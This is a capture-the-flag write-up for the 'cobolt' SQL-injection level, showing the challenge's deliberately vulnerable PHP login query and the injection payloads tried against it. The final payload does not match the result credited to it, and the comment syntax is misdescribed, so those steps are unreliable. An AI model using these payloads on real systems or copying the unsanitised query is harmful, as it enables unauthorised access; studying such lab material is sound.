# cobolt

Here is the code

```php
 <?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

At first, I tried using the same answer as [gremlin](answers/1-gremlin.md).

```
id=' or '1'='1&pw=' or '1'='1
```

But it didn't work. I suspect it's because there is a hashing function with the password. I know that I can disable the password checking by commenting it out.

```
id=' or '1'='1' --
```

But it also didn't work. I kinda got stuck and ended up asking ChatGPT. Turns out, you need an extra space after the double quotes for it to be considered a comment.

```
id=' or '1'='1' -- -
```

After that, I got `Hello rubiya. You are not admin :(`. I complete it after adjusting the payload.

```
id=' -- -
```
